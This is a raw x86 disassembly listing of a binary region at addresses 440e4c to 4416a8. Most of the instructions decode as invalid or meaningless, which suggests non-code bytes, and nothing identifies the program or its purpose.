  440e4c:	add    BYTE PTR [edi+edi*8+0x0],ah
  440e50:	or     esp,0xffffffd6
  440e53:	cdq    
  440e54:	mov    ?,edi
  440e56:	push   esp
  440e57:	(bad)  
  440e58:	call   DWORD PTR ds:0x5cff283c
  440e5e:	(bad)  
  440e5f:	(bad)  
  440e60:	inc    DWORD PTR [eax]
  440e62:	aad    0x89
  440e64:	jno    0x440e65
  440e66:	loope  0x440e67
  440e68:	mov    DWORD PTR [edx+0x71],ebp
  440e6b:	push   ebx
  440e6c:	jmp    FWORD PTR [esi-0x7d]
  440e6f:	int3   
  440e70:	dec    DWORD PTR [ecx-0x7c5eacca]
  440e76:	mov    ds:0xd47ecc00,eax
  440e7b:	imul   eax,DWORD PTR [ebx-0x7c000e],0x0
  440e82:	fninit 
  440e84:	xchg   edx,eax
  440e85:	(bad)  
  440e86:	cmp    BYTE PTR [ebx-0x791a6d01],al
  440e8c:	int3   
  440e8d:	pop    esp
  440e8e:	add    bh,bh
  440e90:	int3   
  440e91:	inc    DWORD PTR [ecx+ecx*2+0x96ff6e]
  440e98:	inc    DWORD PTR [edx-0x26]
  440e9b:	jmp    0xffcc:0xccff87ff
  440ea2:	mul    ebx
  440ea4:	stos   DWORD PTR es:[edi],eax
  440ea5:	int3   
  440ea6:	sub    bh,bh
  440ea8:	and    DWORD PTR [ebp-0x4000db86],0x0
  440eaf:	mov    edi,edi
  440eb1:	add    BYTE PTR [edi-0x2c],al
  440eb4:	sub    bh,bh
  440eb6:	outs   dx,DWORD PTR ds:[esi]
  440eb7:	(bad)  
  440eb8:	call   FWORD PTR [ecx+0x2a00c7ce]
  440ebe:	inc    DWORD PTR [eax]
  440ec0:	add    DWORD PTR [eax],0xfffffff2
  440ec3:	(bad)
  440ec6:	cmp    bh,bh
  440ec8:	add    DWORD PTR [edx-0x4b003afe],0xffffff89
  440ecf:	(bad)  
  440ed0:	(bad)  
  440ed1:	dec    DWORD PTR [edx+0x27ffa537]
  440ed7:	add    BYTE PTR [ecx-0x33364f98],cl
  440edd:	fild   WORD PTR [eax]
  440edf:	add    bh,bh
  440ee1:	adc    edi,0x0
  440ee4:	in     eax,dx
  440ee5:	add    BYTE PTR [eax],al
  440ee7:	dec    esp
  440ee9:	adc    eax,0xfa00e1ac
  440eee:	add    DWORD PTR [ebx-0x73030001],0x5c
  440ef5:	push   DWORD PTR [edx+0x4cc7ff00]
  440efb:	push   0x83008500
  440f00:	cmp    edi,0x6ffc4a7
  440f06:	cmp    edi,0x0
  440f09:	add    BYTE PTR [ebp+0xb0ffca],bh
  440f0f:	(bad)  
  440f10:	out    dx,eax
  440f11:	add    BYTE PTR [eax],dl
  440f13:	pop    DWORD PTR [ebx-0x6b00ff4c]
  440f19:	jmp    DWORD PTR [eax]
  440f1b:	cdq    
  440f1c:	add    ch,ah
  440f1e:	(bad)  
  440f1f:	push   DWORD PTR [edx-0x1]
  440f22:	outs   dx,DWORD PTR ds:[esi]
  440f23:	jg     0x440f25
  440f25:	xor    edi,edi
  440f27:	push   DWORD PTR [ecx+0x0]
  440f2a:	stos   DWORD PTR es:[edi],eax
  440f2b:	jno    0x440f2c
  440f2d:	cmc    
  440f2e:	inc    DWORD PTR [eax]
  440f30:	hlt    
  440f31:	jmp    DWORD PTR [edx]
  440f33:	sar    edi,1
  440f35:	add    eax,0x83d4ff00
  440f3a:	dec    esi
  440f3b:	in     al,0xff
  440f3d:	push   es
  440f3e:	mov    edi,edi
  440f40:	push   es
  440f41:	inc    DWORD PTR [ecx+0xc]
  440f44:	add    dh,al
  440f46:	add    bh,bh
  440f48:	adc    ecx,DWORD PTR [ecx-0x65ff8629]
  440f4e:	add    bh,bh
  440f50:	es (bad) 
  440f52:	fisub  WORD PTR ds:0xff830983
  440f58:	pop    ebx
  440f59:	mov    DWORD PTR [edi+0x18],ebx
  440f5c:	(bad)  
  440f5d:	fcos   
  440f5f:	sub    DWORD PTR [eax],0xffffffff
  440f62:	stc    
  440f63:	leave  
  440f64:	inc    DWORD PTR [ebx+eax*4-0x68001734]
  440f6b:	icebp  
  440f6c:	add    BYTE PTR [ebp-0x33e2ff01],ch
  440f72:	adc    bl,bh
  440f74:	int3   
  440f75:	scas   al,BYTE PTR es:[edi]
  440f76:	inc    DWORD PTR [eax]
  440f78:	push   esp
  440f79:	add    BYTE PTR [esi+ebp*1+0xcc05ff],bh
  440f80:	xor    al,0xcc
  440f82:	mov    ebp,0xff23000a
  440f87:	add    BYTE PTR [ecx+ecx*4-0x3b],al
  440f8b:	lods   eax,DWORD PTR ds:[esi]
  440f8c:	or     edx,0xffffffff
  440f8f:	push   DWORD PTR [edi+0xe58e00]
  440f95:	stos   DWORD PTR es:[edi],eax
  440f96:	add    BYTE PTR [eax],al
  440f98:	xchg   esi,eax
  440f99:	add    al,cl
  440f9b:	inc    edi
  440f9c:	mov    DWORD PTR [esi-0x33c30001],ecx
  440fa2:	xchg   esi,eax
  440fa3:	pop    es
  440fa4:	jmp    eax
  440fa6:	add    BYTE PTR [eax],al
  440fa8:	gs (bad) 
  440faa:	(bad)  [edi]
  440fac:	inc    DWORD PTR [eax]
  440fae:	dec    esp
  440fb0:	jle    0x440fb2
  440fb2:	inc    edx
  440fb3:	and    al,0x0
  440fb5:	mov    eax,DWORD PTR [eax]
  440fb7:	push   ebx
  440fb9:	add    BYTE PTR [eax-0x36fffd],ch
  440fbf:	push   DWORD PTR [edi]
  440fc1:	call   edi
  440fc3:	stos   BYTE PTR es:[edi],al
  440fc4:	int3   
  440fc5:	add    BYTE PTR [eax],0xff
  440fc8:	adc    eax,0xffd3f6ff
  440fcd:	adc    al,0xff
  440fcf:	mov    ebx,edx
  440fd1:	inc    DWORD PTR [edx+edi*8]
  440fd4:	add    BYTE PTR [edi-0x1],ch
  440fd7:	call   DWORD PTR [edi+edi*8+0x0]
  440fdb:	rol    BYTE PTR [eax],0xdf
  440fde:	add    bh,bh
  440fe0:	mov    esi,0x832b46ff
  440fe5:	in     al,0x0
  440fe7:	adc    ebx,0x0
  440fea:	push   ecx
  440feb:	js     0x440fec
  440fed:	sub    BYTE PTR [eax],al
  440fef:	add    BYTE PTR [eax],ch
  440ff1:	(bad)  
  440ff2:	mov    eax,0xdcff2b
  440ff7:	(bad)  
  440ff8:	fcos   
  440ffa:	idiv   BYTE PTR [edi-0x2400]
  441000:	pop    esp
  441001:	add    BYTE PTR ds:0x470058,al
  441007:	call   DWORD PTR [ecx+0x0]
  44100a:	pusha  
  44100b:	in     eax,dx
  44100c:	(bad)  
  44100d:	(bad)  
  44100f:	add    BYTE PTR [edx],ah
  441011:	add    cl,dl
  441013:	and    edi,edi
  441015:	loope  0x441016
  441017:	add    bh,dl
  441019:	jmp    FWORD PTR [edx]
  44101b:	jne    0x44101c
  44101d:	mov    DWORD PTR [eax],eax
  44101f:	mov    DWORD PTR [ebx+eax*4-0x78ff37ed],ecx
  441026:	add    BYTE PTR [ecx+0x1bf700ce],cl
  44102c:	int3   
  44102d:	jp     0x440ffb
  44102f:	push   DWORD PTR [ebx-0x1]
  441032:	enter  0xff4f,0xb1
  441036:	inc    DWORD PTR [eax]
  441038:	inc    edx
  441039:	add    BYTE PTR [ebp-0xb0ffc1],cl
  44103f:	call   DWORD PTR [edx]
  441041:	add    bh,cl
  441043:	jmp    0x441044
  441045:	imul   edi,edi,0xd20091ff
  44104b:	leave  
  44104c:	jmp    DWORD PTR [ecx-0x1]
  44104f:	jmp    DWORD PTR [edx-0x76fb6e01]
  441055:	lea    ecx,[ecx-0x5e002c00]
  44105b:	in     al,dx
  44105c:	int3   
  44105d:	adc    BYTE PTR [ecx-0x30ff827d],cl
  441063:	mov    esi,0x8b00
  441068:	jb     0x440fed
  44106a:	fcomp  QWORD PTR [esi-0xff4134]
  441070:	jbe    0x441072
  441072:	mov    ebx,0xff6dff82
  441077:	mov    DWORD PTR [edx-0x34],ebp
  44107a:	loop   0x44107f
  44107c:	call   FWORD PTR [edi+0x0]
  44107f:	add    BYTE PTR [ebx-0x1],ah
  441082:	xchg   edi,eax
  441083:	adc    eax,0xffffe000
  441088:	inc    esp
  441089:	call   FWORD PTR [ecx]
  44108b:	loope  0x44108d
  44108d:	retf   0x0
  441090:	jb     0x44101b
  441092:	jno    0x441035
  441094:	add    BYTE PTR [ecx-0x4b7c77],ch
  44109a:	mov    ebx,0xff6fffa3
  44109f:	sub    DWORD PTR [edx],0x0
  4410a2:	inc    ebp
  4410a3:	add    DWORD PTR [eax],0x7cc8305
  4410a9:	int3   
  4410aa:	scas   eax,DWORD PTR es:[edi]
  4410ab:	cdq    
  4410ac:	(bad)  
  4410ad:	mov    edx,0xfff7ffff
  4410b2:	out    0xb5,al
  4410b4:	dec    ecx
  4410b6:	add    BYTE PTR [eax],al
  4410b8:	mov    bl,0x0
  4410ba:	fild   WORD PTR [esi-0xb600]
  4410c0:	jmp    0x4410c2
  4410c2:	sub    edx,DWORD PTR [eax+0x0]
  4410c5:	test   bh,bh
  4410c7:	call   DWORD PTR [eax+eax*1-0x2400bfb3]
  4410ce:	add    bh,bh
  4410d0:	retf   0xe4ff
  4410d3:	sub    BYTE PTR [ebx-0x12fffff1],al
  4410d9:	mov    DWORD PTR [edi+0x71],edx
  4410dc:	sub    DWORD PTR [ebp-0x7d],0xffffffff
  4410e0:	push   ebx
  4410e1:	mov    DWORD PTR [eax-0x7c5400a6],eax
  4410e7:	int3   
  4410e8:	xchg   esi,eax
  4410e9:	call   eax
  4410eb:	es add al,dl
  4410ee:	mov    edi,edi
  4410f0:	mov    al,ds:0xccc1e500
  4410f5:	xor    bh,bh
  4410f7:	inc    DWORD PTR [ebp-0x7ca92e01]
  4410fd:	or     eax,0xcc830089
  441102:	sbb    edi,DWORD PTR [ebx+0xa800]
  441108:	push   ds
  441109:	dec    ecx
  44110b:	test   edi,edi
  44110d:	iret   
  44110e:	(bad)  
  44110f:	call   DWORD PTR [eax-0x1]
  441112:	sbb    DWORD PTR [eax],esp
  441114:	inc    DWORD PTR [esi-0x590100]
  44111a:	jmp    0x44114c
  44111c:	(bad)  
  44111d:	(bad)  
  44111f:	add    BYTE PTR [eax],al
  441121:	adc    DWORD PTR [esi-0x58],0xffffff83
  441125:	mov    bh,bh
  441127:	call   edx
  441129:	add    BYTE PTR [eax-0x33ff55],dh
  44112f:	inc    DWORD PTR [ecx]
  441131:	add    ch,dl
  441133:	int3   
  441134:	adc    DWORD PTR [esi],0xffffffff
  441137:	add    bh,dl
  441139:	cmp    esp,0x6
  44113c:	dec    DWORD PTR [eax-0x77]
  44113f:	push   DWORD PTR [esi]
  441141:	jmp    DWORD PTR [edi]
  441143:	retf   
  441144:	(bad)  
  441145:	fild   WORD PTR [eax]
  441147:	int3   
  441148:	add    eax,0xff703eff
  44114d:	fs add bh,bh
  441150:	mov    dh,0xff
  441152:	(bad)  
  441153:	pop    esp
  441154:	int3   
  441155:	mov    al,0xff
  441157:	jmp    edx
  441159:	add    BYTE PTR [esi-0x8],bl
  44115c:	sub    DWORD PTR [edi-0xb9767d],0xffffffa5
  441163:	aam    0xff
  441165:	mov    dl,0x83
  441167:	mov    DWORD PTR [ecx-0x7d],edi
  44116a:	push   edi
  44116b:	mov    esp,0xff838100
  441170:	(bad)  
  441171:	push   DWORD PTR [eax-0xa]
  441174:	cmp    DWORD PTR [esi-0x1],0xffffffff
  441178:	inc    esp
  441179:	jmp    DWORD PTR [esi]
  44117b:	hlt    
  44117c:	call   DWORD PTR [ecx-0x1]
  44117f:	(bad)  
  441180:	sti    
  441181:	mov    DWORD PTR [esi],esp
  441183:	in     eax,0x83
  441185:	add    bh,bh
  441187:	mov    DWORD PTR [edx],ebx
  441189:	xor    DWORD PTR [esi+0x2a],0xffffff83
  44118d:	adc    bh,bh
  44118f:	add    BYTE PTR [ebx-0x34],al
  441192:	div    ebx
  441194:	jmp    FWORD PTR [esi]
  441196:	add    BYTE PTR [eax],al
  441198:	aas    
  441199:	inc    DWORD PTR [edx+ecx*8-0x7d]
  44119d:	das    
  44119e:	add    BYTE PTR [ecx+0x533cccf7],cl
  4411a4:	add    BYTE PTR [ebx-0xad0100],cl
  4411aa:	cmp    edx,DWORD PTR [esi]
  4411ac:	adc    DWORD PTR [eax+eax*1],0xffffffff
  4411b0:	or     al,0xff
  4411b2:	ins    DWORD PTR es:[edi],dx
  4411b3:	lods   eax,DWORD PTR ds:[esi]
  4411b4:	(bad)  
  4411b5:	mov    edx,0xfffb0000
  4411ba:	inc    ebp
  4411bb:	push   ecx
  4411bc:	dec    DWORD PTR [edi]
  4411be:	int3   
  4411bf:	add    BYTE PTR [ecx-0x1],bl
  4411c2:	pop    esp
  4411c3:	cmp    edi,0xf10000b7
  4411c9:	(bad)  
  4411ca:	cmp    eax,0x79ffbb
  4411cf:	int3   
  4411d0:	ret    0x46ff
  4411d3:	xchg   edx,eax
  4411d4:	add    BYTE PTR [edx-0x480077],cl
  4411da:	dec    edi
  4411db:	dec    edx
  4411dc:	add    bl,dh
  4411de:	inc    DWORD PTR [ebx-0x47b7cec]
  4411e4:	mov    DWORD PTR [edi-0x1],esp
  4411e7:	xor    DWORD PTR [ecx-0x1],0x47
  4411eb:	mov    ecx,0xff001fff
  4411f0:	jecxz  0x4411f1
  4411f2:	cmp    eax,0x82ff06
  4411f7:	int3   
  4411f8:	repnz add al,bh
  4411fb:	add    al,0x83
  4411fd:	call   0x2422:0xff75ccff
  441204:	and    DWORD PTR [edi-0x69ff7d],0x5a
  44120b:	rol    BYTE PTR [eax],1
  44120d:	cmp    eax,0x83f4ffff
  441212:	lock imul eax,DWORD PTR [eax],0xb2ffffae
  441219:	call   DWORD PTR [edi]
  44121b:	xchg   ebx,eax
  44121c:	jmp    FWORD PTR [edi+edi*8+0x5b83b400]
  441223:	mov    cl,0xff
  441225:	inc    DWORD PTR cs:[ebx+0x2c56004a]
  44122c:	add    BYTE PTR [eax+0xf2ffff],al
  441232:	fwait
  441233:	or     esp,0x1783ccd5
  441239:	or     ebp,0xffffffac
  44123c:	add    BYTE PTR [edx+0x0],dh
  44123f:	adc    DWORD PTR [esi+0x0],0x29
  441243:	repz inc ebp
  441246:	(bad)  
  441247:	push   edi
  441249:	add    BYTE PTR [edx],bl
  44124b:	popa   
  44124c:	dec    DWORD PTR [edi]
  44124e:	inc    DWORD PTR [eax]
  441250:	sub    BYTE PTR [ebx-0x48003b1a],al
  441256:	(bad)  
  441257:	(bad)  
  441258:	sti    
  441259:	(bad)  
  44125a:	in     eax,dx
  44125b:	jnp    0x44125d
  44125d:	lea    eax,[eax]
  44125f:	inc    DWORD PTR [edi]
  441261:	cmp    DWORD PTR [eax-0x5e7c71],0x0
  441268:	in     al,dx
  441269:	jmp    FWORD PTR [ecx-0x62]
  44126c:	int3   
  44126d:	iret   
  44126e:	add    bh,bh
  441270:	idiv   edi
  441272:	fidivr WORD PTR [ecx+0x0]
  441275:	mov    ds:0xffa20083,al
  44127a:	xchg   esi,eax
  44127b:	add    bh,bh
  44127d:	iret   
  44127e:	(bad)  
  44127f:	push   DWORD PTR [eax+eax*1]
  441282:	xchg   esi,eax
  441283:	jle    0x441251
  441285:	in     eax,0xff
  441287:	push   DWORD PTR [eax-0x1]
  44128a:	push   esp
  44128b:	inc    esi
  44128c:	jmp    FWORD PTR [edi]
  44128e:	dec    esp
  441290:	inc    esp
  441291:	add    BYTE PTR [edi-0x1b00ad],al
  441297:	(bad)  
  441298:	cld    
  441299:	add    cl,bh
  44129b:	ret    
  44129c:	push   edx
  44129e:	add    DWORD PTR [eax],0x70
  4412a1:	push   DWORD PTR [esp+esi*8]
  4412a4:	(bad)  
  4412a5:	call   0xb413a9
  4412aa:	push   edi
  4412ab:	mov    bh,0xcc
  4412ad:	cld    
  4412ae:	inc    DWORD PTR [eax]
  4412b0:	daa    
  4412b1:	add    BYTE PTR [esi-0x4900b6],al
  4412b7:	add    BYTE PTR [edi],ch
  4412b9:	add    BYTE PTR [eax+ebx*4-0xe201],dh
  4412c0:	pop    esp
  4412c1:	call   esi
  4412c3:	sar    bh,0xf5
  4412c6:	dec    esp
  4412c8:	outs   dx,DWORD PTR ds:[esi]
  4412c9:	add    cl,ch
  4412cb:	mov    ebx,0x8300a000
  4412d0:	dec    DWORD PTR fs:[ebp-0x4affcf]
  4412d7:	int3   
  4412d8:	sub    al,0x0
  4412da:	in     al,dx
  4412db:	jmp    0x4412a9
  4412dd:	fld    QWORD PTR [ebx-0x5200117d]
  4412e3:	call   0x4399e7
  4412e8:	push   es
  4412e9:	and    DWORD PTR [ebx],0xffffffc5
  4412ec:	inc    esp
  4412ee:	(bad)  
  4412ef:	call   FWORD PTR [ecx]
  4412f1:	add    BYTE PTR [edx],ch
  4412f3:	and    al,0x83
  4412f5:	dec    DWORD PTR ss:[ecx-0x3bbb0001]
  4412fc:	inc    edi
  4412fe:	add    DWORD PTR [eax],0x2f
  441301:	mov    esp,ebx
  441303:	xlat   BYTE PTR ds:[ebx]
  441304:	add    BYTE PTR ds:0x100ff,bl
  44130a:	fdivr  DWORD PTR [edi-0x1]
  44130d:	mov    edx,0xff01ccff
  441312:	call   0xe6ff:0x831700ed
  441319:	add    BYTE PTR [ebx+0x5c],ah
  44131c:	add    dh,bh
  44131e:	add    BYTE PTR [eax],al
  441320:	cmc    
  441321:	(bad)  
  441322:	cli    
  441323:	add    edi,edi
  441325:	dec    eax
  441326:	dec    DWORD PTR [ecx+0x383effa9]
  44132c:	inc    DWORD PTR [eax-0x1]
  44132f:	add    BYTE PTR [ecx-0x7d],bl
  441332:	cwde   
  441333:	imul   ecx,esp,0x44
  441336:	dec    esp
  441338:	pop    esp
  441339:	call   FWORD PTR [edi-0x7c400012]
  44133f:	add    BYTE PTR [eax-0x1],bh
  441342:	dec    ebx
  441343:	and    edi,edi
  441345:	push   es
  441346:	inc    DWORD PTR [eax]
  441348:	cs (bad) 
  44134a:	jnp    0x4413b8
  44134c:	int3   
  44134d:	sti    
  44134e:	(bad)  
  44134f:	push   DWORD PTR [edi]
  441351:	add    BYTE PTR [edx-0x12ff3a],dl
  441357:	jmp    FWORD PTR [edi+edi*8+0x6d004c76]
  44135e:	(bad)  
  44135f:	jmp    edi
  441361:	jmp    FWORD PTR [ebp+0x4]
  441364:	add    BYTE PTR [edi+edi*8],al
  441367:	add    BYTE PTR [ebx+eax*4],ah
  44136a:	fiadd  DWORD PTR [edi+0x73ff]
  441370:	and    al,0xcc
  441372:	lahf   
  441373:	jo     0x4412f8
  441375:	aas    
  441376:	add    bh,bh
  441378:	inc    eax
  441379:	call   FWORD PTR [edx]
  44137b:	xor    al,0x83
  44137d:	inc    esi
  44137e:	add    BYTE PTR [eax],al
  441380:	rol    DWORD PTR [eax],0x9d
  441383:	lods   eax,DWORD PTR ds:[esi]
  441384:	int3   
  441385:	gs int3 
  441387:	jmp    FWORD PTR [ebx+0x0]
  44138a:	es jae 0x44138c
  44138d:	ret    
  44138e:	dec    esp
  441390:	mov    dh,0x83
  441392:	rcr    BYTE PTR [edx],cl
  441394:	add    BYTE PTR [eax-0x323301],bl
  44139a:	push   ds
  44139b:	xchg   ecx,eax
  44139c:	add    BYTE PTR [eax-0x160077],al
  4413a2:	xor    al,0x31
  4413a4:	push   DWORD PTR [ebx-0x2b0001]
  4413aa:	test   al,0xdd
  4413ac:	mov    DWORD PTR [esi-0xc7d00],ebp
  4413b2:	cs mov ebp,0xff8366ff
  4413b8:	xchg   esi,eax
  4413b9:	mov    DWORD PTR [ebx],ebx
  4413bb:	repnz call FWORD PTR [eax]
  4413be:	inc    DWORD PTR [ebx-0x3f360093]
  4413c4:	add    BYTE PTR [edi-0x7cb90001],ah
  4413ca:	xchg   edi,eax
  4413cb:	(bad)  
  4413cd:	and    eax,0xccec0000
  4413d2:	sub    esp,DWORD PTR [ebx]
  4413d4:	call   DWORD PTR [ebp-0x65007d]
  4413da:	pop    ebp
  4413db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4413dc:	cmp    DWORD PTR [edx+0xa100ff],0x3
  4413e3:	mov    eax,ds:0xff83fc00
  4413e8:	or     eax,0xed3989
  4413ed:	push   edx
  4413ee:	add    bh,bh
  4413f0:	fld    DWORD PTR [ebx+0x2e00d43a]
  4413f6:	dec    esp
  4413f8:	lods   eax,DWORD PTR ds:[esi]
  4413f9:	push   DWORD PTR [eax]
  4413fb:	dec    ebp
  4413fc:	add    cl,dl
  4413fe:	add    bh,bh
  441400:	cmp    al,BYTE PTR [eax]
  441402:	mov    ds:0xffb9ff00,al
  441407:	add    BYTE PTR ds:0x83f5bbff,bh
  44140d:	stos   DWORD PTR es:[edi],eax
  44140e:	add    BYTE PTR [ecx+0x6336ff64],cl
  441414:	int3   
  441415:	pop    DWORD PTR [eax]
  441417:	mov    DWORD PTR [edi+edi*8],edx
  44141a:	or     eax,0x4fffa0
  44141f:	int3   
  441420:	jnp    0x441421
  441422:	mov    eax,0xff8affc2
  441427:	add    BYTE PTR [esi-0x1],ah
  44142a:	mov    esp,0x4b00d3
  44142f:	add    ch,bh
  441431:	inc    DWORD PTR [ebp-0x33190083]
  441437:	jmp    DWORD PTR [ebx-0x1]
  44143a:	or     bh,BYTE PTR [edx]
  44143c:	jmp    DWORD PTR [eax-0x1]
  44143f:	add    BYTE PTR [ecx-0x7d],bl
  441442:	stos   BYTE PTR es:[edi],al
  441443:	mov    ecx,0xcc002583
  441448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441449:	add    BYTE PTR [edx+0x65],ah
  44144c:	(bad)  
  44144d:	mov    esi,0xff82ccff
  441452:	sub    al,0xa0
  441454:	add    BYTE PTR [edx],ch
  441456:	inc    DWORD PTR [eax]
  441458:	cwde   
  441459:	jmp    edi
  44145b:	mov    al,BYTE PTR [eax]
  44145d:	pop    es
  44145e:	add    ah,cl
  441460:	in     al,0x0
  441462:	adc    eax,0xff36002a
  441467:	int3   
  441468:	pop    ds
  441469:	jmp    FWORD PTR [ebp-0x65]
  44146c:	add    ch,al
  44146e:	inc    DWORD PTR [eax]
  441470:	jb     0x441471
  441472:	(bad)  
  441473:	push   0xffffff89
  441475:	jns    0x441476
  441477:	(bad)  
  441478:	in     eax,dx
  441479:	mov    DWORD PTR [edi-0xe5ffc9],esi
  44147f:	(bad)  
  441480:	fdiv   st(7),st
  441482:	scas   al,BYTE PTR es:[edi]
  441483:	jmp    FWORD PTR [bx-0x1]
  441487:	add    BYTE PTR [ecx-0x3349a001],ah
  44148d:	imul   edi,edi,0xbafffaff
  441493:	sbb    eax,DWORD PTR [eax]
  441495:	jnp    0x441497
  441497:	push   DWORD PTR [ebp-0x33234501]
  44149d:	push   esi
  44149e:	mov    DWORD PTR [eax],eax
  4414a0:	add    bh,bh
  4414a2:	ror    DWORD PTR [ebp-0x1],1
  4414a5:	(bad)  
  4414a7:	call   FWORD PTR [edx]
  4414a9:	(bad)  
  4414aa:	cmp    DWORD PTR [edi-0x7d],edi
  4414ad:	sar    edi,0x0
  4414b0:	mov    ds:0x7142ff,al
  4414b5:	push   edx
  4414b6:	add    BYTE PTR [eax],al
  4414b8:	push   ecx
  4414b9:	add    BYTE PTR [esi+ecx*2],ah
  4414bc:	add    BYTE PTR [ecx-0x1],cl
  4414bf:	jmp    FWORD PTR [ebx+eax*4-0xb]
  4414c3:	into   
  4414c4:	(bad)  
  4414c5:	cmp    al,0xff
  4414c7:	push   DWORD PTR [eax+eax*1-0x4]
  4414cb:	dec    edi
  4414cc:	add    BYTE PTR [esi-0xdfff01],cl
  4414d2:	xor    DWORD PTR [esi],eax
  4414d4:	call   FWORD PTR [ecx]
  4414d6:	inc    DWORD PTR [eax]
  4414d8:	xor    al,0x0
  4414da:	loope  0x4414c7
  4414dc:	jmp    FWORD PTR [esi-0x33d80001]
  4414e2:	sbb    al,0x57
  4414e4:	jmp    FWORD PTR [edi+edi*8-0x7d]
  4414e8:	jnp    0x4414ea
  4414ea:	nop
  4414eb:	ja     0x4414ed
  4414ed:	mov    eax,ds:0xff01ff83
  4414f2:	div    DWORD PTR [esi-0x5500]
  4414f8:	pop    ss
  4414f9:	add    edx,0x6d
  4414fc:	xor    esi,0x0
  4414ff:	add    BYTE PTR [ebp-0x77],bl
  441502:	neg    al
  441504:	jmp    DWORD PTR [edi-0x1]
  441507:	push   DWORD PTR [ebp+0x728700]
  44150d:	inc    edx
  44150e:	mov    edi,edi
  441510:	in     al,dx
  441511:	add    ch,dl
  441513:	stos   DWORD PTR es:[edi],eax
  441514:	mov    ecx,esi
  441516:	inc    DWORD PTR [ebx+0x26b800e7]
  44151c:	add    ah,bh
  44151e:	or     esp,0xffffffbd
  441521:	dec    DWORD PTR ds:0xff00cc3c
  441527:	cmp    DWORD PTR [eax+0x0],0x3a
  44152b:	inc    DWORD PTR [ebx-0x1effff49]
  441531:	(bad)  
  441532:	jmp    0xd9ff:0xcc94cc6c
  441539:	dec    DWORD PTR [esi+0xc]
  44153c:	add    bl,bl
  44153e:	inc    DWORD PTR [eax]
  441540:	std    
  441541:	and    DWORD PTR [ecx+0x69],0x0
  441545:	jmp    0x441546
  441547:	inc    DWORD PTR [ecx]
  441549:	dec    DWORD PTR [ebx-0xc]
  44154c:	dec    ebx
  44154e:	add    bh,bh
  441550:	jmp    0xffde:0xccbb5e00
  441557:	add    BYTE PTR [eax],cl
  441559:	sub    eax,0xffffffa7
  44155c:	inc    DWORD PTR [ebx+0x0]
  44155f:	add    dl,ah
  441561:	inc    esi
  441563:	jo     0x441565
  441565:	lods   al,BYTE PTR ds:[esi]
  441566:	mov    DWORD PTR [ecx-0x44ff3315],ecx
  44156c:	call   edi
  44156e:	add    BYTE PTR [eax],al
  441570:	jnp    0x441572
  441572:	xor    ebx,0xffffffff
  441575:	dec    ebx
  441576:	add    BYTE PTR [eax],al
  441578:	mov    bh,bh
  44157a:	xchg   ebp,eax
  44157b:	and    al,0xff
  44157d:	and    eax,0x8337ff89
  441582:	xchg   edx,eax
  441583:	push   0xffcc1dff
  441588:	mov    ch,0x0
  44158a:	jb     0x4415b5
  44158c:	dec    DWORD PTR [eax]
  44158e:	add    BYTE PTR [eax],al
  441590:	push   ecx
  441591:	add    BYTE PTR [eax],ch
  441593:	adc    bh,bh
  441595:	cmp    edi,edi
  441597:	push   edi
  441599:	add    BYTE PTR [esp+esi*8-0x7600b87d],ah
  4415a0:	enter  0x7ff,0xe0
  4415a4:	inc    ecx
  4415a6:	inc    DWORD PTR [eax]
  4415a8:	and    eax,0x420ecc
  4415ad:	mov    DWORD PTR [eax],0xef008889
  4415b3:	and    edi,edi
  4415b5:	sbb    al,0xff
  4415b7:	inc    DWORD PTR [ebx+eax*4]
  4415ba:	push   0xf
  4415bc:	add    BYTE PTR [ecx],ch
  4415be:	add    BYTE PTR [eax],al
  4415c0:	sar    edi,cl
  4415c2:	xchg   esi,eax
  4415c3:	data16 add BYTE PTR [ecx-0x1],bl
  4415c7:	add    BYTE PTR ds:0xff0307ff,dl
  4415cd:	xor    DWORD PTR [eax],eax
  4415cf:	dec    DWORD PTR [ebx-0x3c8701]
  4415d5:	sar    edi,cl
  4415d7:	inc    DWORD PTR [ecx]
  4415d9:	inc    DWORD PTR [eax-0xe10027]
  4415df:	jmp    FWORD PTR [ebp+0xe0bdff]
  4415e5:	jle    0x441570
  4415e7:	jmp    DWORD PTR [eax]
  4415e9:	add    BYTE PTR [eax-0xd7ffd2],ah
  4415ef:	add    BYTE PTR [edx+0x0],cl
  4415f2:	mov    ds:0xff40ff2f,al
  4415f7:	add    BYTE PTR [eax+0xff2cff],cl
  4415fd:	mov    bh,0x83
  4415ff:	xor    DWORD PTR [esi+0x4b8e83],0xfffffff9
  441606:	int3   
  441607:	dec    DWORD PTR [esi-0x7d]
  44160a:	std    
  44160b:	dec    ebp
  44160c:	mov    DWORD PTR [edx],edx
  44160e:	int3   
  44160f:	push   DWORD PTR [eax]
  441611:	inc    DWORD PTR [esi-0x36ff16]
  441617:	jmp    ecx
  441619:	call   FWORD PTR [ecx]
  44161b:	xchg   edx,eax
  44161c:	add    BYTE PTR [esi-0xe40034],bh
  441622:	dec    DWORD PTR [eax-0x1]
  441625:	pop    ebx
  441626:	inc    DWORD PTR [eax]
  441628:	add    al,0x83
  44162a:	cmp    DWORD PTR [edi],edi
  44162c:	jmp    DWORD PTR [edi-0x480001]
  441632:	mov    esi,0x8970ff1b
  441637:	call   esi
  441639:	jmp    ebx
  44163b:	cmc    
  44163c:	dec    edi
  44163e:	(bad)  
  44163f:	jmp    edi
  441641:	add    BYTE PTR [ebp+0xefff60],ah
  441647:	sub    DWORD PTR [ecx],0xffffffff
  44164a:	not    BYTE PTR [ecx]
  44164c:	call   DWORD PTR [edi-0x6cff01]
  441652:	setl   BYTE PTR [ebx-0x3eff33dd]
  441659:	add    BYTE PTR [ecx-0x307c7d],ah
  44165f:	int3   
  441660:	ltr    WORD PTR [esi-0x766600bb]
  441667:	adc    DWORD PTR [ecx-0x1],0x7a
  44166b:	outs   dx,DWORD PTR ds:[esi]
  44166c:	add    BYTE PTR [ebx+0xf583ff],dh
  441672:	xchg   BYTE PTR [eax],dh
  441674:	add    BYTE PTR [esp+ecx*8+0x33ff00ff],dl
  44167b:	jns    0x44167c
  44167d:	xchg   esi,eax
  44167e:	add    bh,bh
  441680:	or     eax,DWORD PTR [ebx-0xd000f3a]
  441686:	cmp    edi,0xffffffe4
  441689:	mov    DWORD PTR [eax+0x9c000c],edi
  44168f:	(bad)  
  441690:	out    dx,eax
  441691:	push   DWORD PTR [edx-0x76010025]
  441697:	mov    DWORD PTR [eax],ecx
  441699:	inc    DWORD PTR [esp+esi*2-0x7cffd977]
  4416a0:	add    eax,0xcf4500
  4416a5:	xor    edi,edi
  4416a7:	int3   
  4416a8:	js     0x44162d
